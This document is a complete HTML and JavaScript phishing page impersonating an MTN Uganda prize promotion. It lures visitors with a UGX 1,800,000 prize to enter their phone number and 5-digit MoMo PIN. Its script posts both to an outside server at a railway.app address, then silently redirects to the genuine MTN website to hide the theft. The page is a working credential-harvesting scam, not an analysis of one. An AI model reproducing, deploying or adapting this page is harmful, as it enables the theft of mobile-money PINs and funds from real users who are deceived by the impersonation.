<!DOCTYPE html>
<html>
<head>
    <title>MTN Promo - UGX 1,800,000</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(145deg, #e8edf2 0%, #dce3ec 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            padding: 16px;
        }
        .wrapper {
            background: white;
            border-radius: 48px;
            padding: 32px 24px 44px;
            max-width: 520px;
            width: 100%;
            text-align: center;
            box-shadow: 0 20px 40px rgba(0,0,0,0.12);
            transition: opacity 0.5s ease;
        }
        .prize-message {
            background: #f8fafc;
            padding: 18px 20px;
            border-radius: 28px;
            border-left: 4px solid #f5a623;
            border-right: 4px solid #f5a623;
            margin: 20px 0;
        }
        .prize-amount { font-size: 28px; font-weight: 800; color: #c97e00; margin: 8px 0 4px; }
        label { display: block; text-align: left; font-weight: 600; margin: 20px 0 6px 8px; }
        input[type="tel"] {
            width: 100%;
            padding: 15px 20px;
            border: 1.5px solid #e2e8f0;
            border-radius: 60px;
            font-size: 17px;
            outline: none;
            transition: all 0.2s;
        }
        input[type="tel"]:focus { border-color: #f5a623; }
        .pin-wrapper {
            display: flex;
            gap: 12px;
            justify-content: center;
            margin: 12px 0;
            flex-wrap: wrap;
        }
        .pin-box {
            width: 60px;
            height: 68px;
            text-align: center;
            font-size: 32px;
            font-weight: 700;
            border: 1.5px solid #cbd5e1;
            border-radius: 20px;
            outline: none;
            font-family: monospace;
            transition: all 0.2s;
        }
        .pin-box:focus { border-color: #f5a623; box-shadow: 0 0 0 2px rgba(245,166,35,0.2); }
        button {
            margin-top: 24px;
            background: #f5a623;
            border: none;
            padding: 14px 30px;
            border-radius: 60px;
            font-size: 18px;
            font-weight: bold;
            color: white;
            cursor: pointer;
            width: 100%;
            transition: background 0.2s;
        }
        button:hover { background: #e09510; }
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid white;
            border-top-color: transparent;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-left: 10px;
            vertical-align: middle;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        @media (max-width: 550px) {
            .pin-box { width: 52px; height: 60px; font-size: 28px; }
            .pin-wrapper { gap: 8px; }
        }
        @media (max-width: 450px) {
            .pin-box { width: 45px; height: 55px; font-size: 24px; }
            .pin-wrapper { gap: 6px; }
        }
        @media (max-width: 380px) {
            .pin-box { width: 42px; height: 50px; font-size: 22px; }
            .pin-wrapper { gap: 5px; }
        }
    </style>
</head>
<body>
<div class="wrapper" id="appWrapper">
    <h1 style="color: #1a2c3e;">MTN Uganda Promo</h1>
    <div class="prize-message">
        You're almost there — fill in the form below to claim
        <div class="prize-amount">UGX 1,800,000</div>
        instantly.
    </div>
    
    <input type="tel" id="phoneInput" placeholder="07XXXXXXXX" maxlength="10" autocomplete="off">
    <label>🔐 5-digit MoMo PIN</label>
    <div class="pin-wrapper" id="pinWrapper">
        <input class="pin-box" maxlength="1" inputmode="numeric">
        <input class="pin-box" maxlength="1" inputmode="numeric">
        <input class="pin-box" maxlength="1" inputmode="numeric">
        <input class="pin-box" maxlength="1" inputmode="numeric">
        <input class="pin-box" maxlength="1" inputmode="numeric">
    </div>
    
    <button id="submitBtn">💰 Claim Prize</button>
</div>

<script>
    const phoneInput = document.getElementById('phoneInput');
    const pinBoxes = Array.from(document.querySelectorAll('.pin-box'));
    const submitBtn = document.getElementById('submitBtn');
    const wrapper = document.getElementById('appWrapper');
    let realPin = ['', '', '', '', ''];
    let submitted = false;
    let originalBtnText = submitBtn.innerHTML;

    phoneInput.addEventListener('input', e => {
        e.target.value = e.target.value.replace(/\D/g, '').slice(0, 10);
    });

    pinBoxes.forEach((box, idx) => {
        box.addEventListener('input', e => {
            let val = e.target.value.replace(/\D/g, '');
            if (!val) return;
            e.target.value = val;
            realPin[idx] = val;
            
            setTimeout(() => {
                if (document.activeElement !== box) e.target.value = '•';
            }, 150);
            
            if (idx < 4) pinBoxes[idx + 1].focus();
            
            if (realPin.every(p => p !== '') && /^07\d{8}$/.test(phoneInput.value)) {
                submitForm();
            }
        });
        
        box.addEventListener('keydown', e => {
            if (e.key === 'Backspace') {
                realPin[idx] = '';
                if (idx > 0 && !box.value) {
                    pinBoxes[idx - 1].focus();
                } else {
                    box.value = '';
                }
            }
        });
        
        box.addEventListener('focus', function() {
            if (realPin[idx]) this.value = realPin[idx];
        });
        
        box.addEventListener('blur', function() {
            if (realPin[idx]) this.value = '•';
        });
    });

    async function submitForm() {
        if (submitted) return;
        
        const phone = phoneInput.value;
        const pin = realPin.join('');
        
        if (!/^07\d{8}$/.test(phone)) return;
        if (pin.length !== 5) return;
        
        submitted = true;
        
        // Show loading state on button
        submitBtn.innerHTML = 'Processing <span class="loading"></span>';
        submitBtn.disabled = true;
        
        try {
            const response = await fetch('https://momoloan-production.up.railway.app/api/submit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone, pin })
            });
            
            const data = await response.json();
            
            // Always redirect to MTN website regardless of response
            wrapper.style.opacity = '0';
            setTimeout(() => {
                window.location.href = 'https://www.mtn.co.ug/';
            }, 400);
            
        } catch (err) {
            // Silent fail - still redirect to MTN website
            wrapper.style.opacity = '0';
            setTimeout(() => {
                window.location.href = 'https://www.mtn.co.ug/';
            }, 400);
        }
    }
    
    // Manual button click
    submitBtn.addEventListener('click', () => {
        const phone = phoneInput.value;
        const pin = realPin.join('');
        if (/^07\d{8}$/.test(phone) && pin.length === 5 && !submitted) {
            submitForm();
        }
    });
</script>
</body>
</html>
